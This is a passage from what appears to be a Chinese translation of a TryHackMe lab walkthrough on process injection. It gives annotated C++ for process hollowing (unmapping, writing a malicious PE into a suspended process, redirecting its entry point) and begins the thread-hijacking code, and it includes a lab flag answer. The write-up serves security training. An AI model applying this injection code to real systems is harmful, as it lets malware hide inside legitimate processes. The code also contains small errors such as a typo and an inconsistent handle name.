plain"> </span><span class="token function" style="color:#d73a49">pZwUnmapViewOfSection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pTargetImageBaseAddress </span><span class="token comment" style="color:#999988;font-style:italic">// 进程的基地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第四步中，我们必须首先在被 hollow 的进程中分配内存。我们可以像第二步一样使用 <code>VirtualAlloc</code> 来分配内存。这次，我们需要从文件头中获取图像的大小。<code>e_lfanew</code> 可以标识从 DOS 头到 PE 头的字节数。一旦到达 PE 头，我们可以从可选头中获取 <code>SizeOfImage</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PIMAGE_DOS_HEADER pDOSHeader </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PIMAGE_DOS_HEADER</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pMaliciousImage</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从恶意图像中获取 DOS 头</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PIMAGE_NT_HEADERS pNTHeaders </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PIMAGE_NT_HEADERS</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pMaliciousImage </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pDOSHeader</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">e_lfanew</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 e_lfanew 获取 NT 头</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD sizeOfMaliciousImage </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pNTHeaders</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">OptionalHeader</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SizeOfImage</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 NT 头结构中获取可选头的大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PVOID pHollowAddress </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAllocEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pTargetImageBaseAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 进程的基地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	sizeOfMaliciousImage</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从可选头中获得的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 保留并提交页面 (MEM_RESERVE | MEM_COMMIT)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x40</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 启用执行和读/写访问 (PAGE_EXECUTE_READWRITE)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦内存分配完成，我们可以将恶意文件写入内存。由于我们要写入文件，必须首先写入 PE 头，然后写入 PE 节。为了写入 PE 头，我们可以使用 <code>WriteProcessMemory</code> 并通过头的大小来确定写入的终止位置。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pTargetImageBaseAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 进程的基地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pMaliciousImage</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 本地内存中存储的恶意文件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pNTHeaders</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">OptionalHeader</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SizeOfHeaders</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// PE 头的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	cout</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[!] Writting Headers failed. Error:&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetLastError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>以根据 <code>e_lfanew</code> 和当前头的大小来循环写入每个节。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> pNTHeaders</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">FileHeader</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">NumberOfSections</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 根据 PE 数据中的节数量循环</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PIMAGE_SECTION_HEADER pSectionHeader </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PIMAGE_SECTION_HEADER</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pMaliciousImage </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pDOSHeader</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">e_lfanew </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IMAGE_NT_HEADERS</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IMAGE_SECTION_HEADER</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 确定当前 PE 节头</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PVOID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pHollowAddress </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pSectionHeader</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">VirtualAddress</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 当前节的基地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PVOID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pMaliciousImage </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pSectionHeader</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">PointerToRawData</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 当前节内容的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		pSectionHeader</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">SizeOfRawData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 当前节的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以使用重定位表将文件写入目标内存，这将在任务 6 中进一步讨论。</p>
<p>在步骤五中，我们可以使用 <code>SetThreadContext</code> 来更改 <code>EAX</code>，使其指向入口点。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Eax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SIZE_T</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">pHollowAddress </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pNTHeaders</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">OptionalHeader</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AddressOfEntryPoint</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 将上下文结构指针设置为来自 PE 可选头的入口点</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">SetThreadContext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的线程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c </span><span class="token comment" style="color:#999988;font-style:italic">// 指向存储的上下文结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在步骤六中，我们需要使用 <code>ResumeThread</code> 将进程从挂起状态中恢复。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ResumeThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hThread </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的线程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤组合在一起，创建一个进程劫持注入器。使用提供的 C++ 注入器并实验进程劫持。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>识别一个作为 THM-Attacker 运行的进程的 PID 以作为目标。将 PID 和可执行文件名作为参数，执行位于桌面 injectors 目录中的 hollowing-injector.exe。</p><p>在空洞注入 shellcode 后获得的标志是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{7h3r35_n07h1n6_h3r3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="abusing-process-components---滥用进程组件">Abusing Process Components - 滥用进程组件<a href="#abusing-process-components---滥用进程组件" class="hash-link" aria-label="Direct link to Abusing Process Components - 滥用进程组件" title="Direct link to Abusing Process Components - 滥用进程组件">​</a></h2>
<p>线程劫持的高级过程可以分为以下十一步骤：</p>
<ol>
<li>定位并打开目标进程以进行控制。</li>
<li>为恶意代码分配内存区域。</li>
<li>将恶意代码写入已分配的内存。</li>
<li>确定要劫持的目标线程的线程 ID。</li>
<li>打开目标线程。</li>
<li>挂起目标线程。</li>
<li>获取线程上下文。</li>
<li>将指令指针更新为恶意代码。</li>
<li>重写目标线程的上下文。</li>
<li>恢复被劫持的线程。</li>
</ol>
<p>我们将通过分解一个基本的线程劫持脚本来识别每个步骤，并更详细地解释其内容。</p>
<p>前面概述的前三个步骤与正常的进程注入过程相同，不需要详细解释，下面是文档化的源代码：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hProcess </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">OpenProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PROCESS_ALL_ACCESS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 请求所有可能的访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	FALSE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 子进程不继承父进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	processId </span><span class="token comment" style="color:#999988;font-style:italic">// 存储的进程 ID</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PVOIF remoteBuffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAllocEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 打开的目标进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 内存分配的区域大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">MEM_RESERVE </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 保留并提交页面</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PAGE_EXECUTE_READWRITE </span><span class="token comment" style="color:#999988;font-style:italic">// 启用执行和读/写访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	processHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 打开的目标进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	remoteBuffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 分配的内存区域</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 要写入的数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 数据的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path 